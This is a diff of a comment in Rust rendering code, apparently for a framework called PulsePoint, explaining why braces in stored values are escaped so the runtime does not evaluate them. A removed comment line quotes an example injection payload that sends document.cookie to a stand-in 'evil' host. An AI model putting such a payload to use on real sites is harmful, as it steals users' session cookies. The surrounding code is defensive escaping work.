@@ -408,10 +408,11 @@ fn neutralise_script_breakouts(json: &str) -> String {
 }
 
 // A value's braces are written as character references, in text and in
-// attributes alike. PulsePoint compiles the rendered page: a `{…}` whose body
-// parses as JavaScript is an expression it evaluates, and braces are not
-// HTML-special, so a stored `{fetch('//evil/' + document.cookie)}` would pass
-// HTML escaping untouched and run in the browser. `&#123;` shows a brace
+// attributes alike. PulsePoint compiles nothing on the page, but it looks up
+// every live `{…}` it finds: a bare name reads the block's state and the exact
+// source of a compiled binding runs that binding. Braces are not HTML-special,
+// so a stored `{count}` would pass HTML escaping untouched and show the
+// block's state instead of the user's text. `&#123;` shows a brace
 // wherever the browser renders it, and inside the root layout's deferred
 // `<template pp-component>` it is raised one more layer (see
 // [`render_deferred_children`]) so the runtime reads a reference rather than
